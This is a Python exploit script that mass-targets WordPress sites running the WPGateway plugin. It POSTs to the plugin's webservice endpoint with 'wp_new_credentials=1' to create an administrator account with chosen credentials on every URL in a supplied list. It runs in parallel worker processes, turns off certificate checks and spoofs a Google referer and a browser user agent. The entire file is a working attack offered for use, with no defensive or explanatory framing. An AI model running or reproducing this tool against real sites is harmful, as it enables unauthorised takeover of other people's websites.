#!/usr/bin/env python
import argparse
import multiprocessing
import os
import sys
import urllib.parse
from typing import Any, TypedDict

import requests

requests.packages.urllib3.disable_warnings()


class Payload(TypedDict):
    admin_firstname: str
    admin_email: str
    admin_password: str
    admin_username: str
    admin_lastname: str


class Worker(multiprocessing.Process):
    ENDPOINT = '/wp-content/plugins/wpgateway/wpgateway-webservice-new.php?wp_new_credentials=1'

    def __init__(
        self,
        email: str,
        username: str,
        password: str,
        first_name: str,
        last_name: str,
        user_agent: str,
        queue: multiprocessing.JoinableQueue,
        *args: Any,
        **kwargs: Any,
    ) -> None:
        self.email = email
        self.username = username
        self.password = password
        self.first_name = first_name
        self.last_name = last_name
        self.user_agent = user_agent
        self.queue = queue
        super().__init__(*args, **kwargs)

    def get_session(self) -> requests.Session:
        session = requests.session()
        session.headers.update(
            {'Referer': 'https://www.google.com', 'User-Agent': self.user_agent}
        )
        return session

    def get_payload(self) -> Payload:
        return {
            'admin_email': self.email,
            'admin_username': self.username,
            'admin_password': self.password,
            'admin_firstname': self.first_name,
            'admin_lastname': self.last_name,
        }

    def run(self) -> None:
        session = self.get_session()
        while self.queue.qsize() > 0:
            try:
                url = self.queue.get()
                endpoint = urllib.parse.urljoin(url, self.ENDPOINT)
                r = session.post(
                    endpoint, json=self.get_payload(), verify=False, timeout=3.0
                )
                r.raise_for_status()
                data = r.json()
                print(endpoint, '=>', data, flush=True)
            except Exception as e:
                print(str(e), file=sys.stderr)
            finally:
                self.queue.task_done()


def main() -> None:
    parser = argparse.ArgumentParser(
        description='Create new administrator without administrative privileges'
    )
    parser.add_argument(
        '-i', '--input', type=argparse.FileType(), default='-', help='urls'
    )
    parser.add_argument(
        '-u',
        '--username',
        help='username',
        default='admin123',
    )
    parser.add_argument(
        '--email',
        help='email',
        default='admin123@wordpress.org',
    )
    parser.add_argument('-p', '--password', help='password', default='123456q!')
    parser.add_argument(
        '--first-name',
        help='first name',
        default='John',
    )
    parser.add_argument(
        '--last-name',
        help='last name',
        default='Connor',
    )
    parser.add_argument(
        '-a',
        '--user-agent',
        help='http user agent',
        default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    )
    parser.add_argument(
        '-w',
        '--workers',
        help='number of worker processes',
        type=int,
        default=os.cpu_count(),
    )
    args = parser.parse_args()
    queue = multiprocessing.JoinableQueue()

    for line in args.input:
        if not (line := line.strip()):
            break
        queue.put_nowait(line if '://' in line else f'http://{line}')

    workers = []
    for _ in range(args.workers):
        p = Worker(
            username=args.username,
            email=args.email,
            password=args.password,
            first_name=args.first_name,
            last_name=args.last_name,
            user_agent=args.user_agent,
            queue=queue,
            daemon=True,
        )
        p.start()
        workers.append(p)

    queue.join()

    for w in workers:
        w.join()


if __name__ == '__main__':
    main()
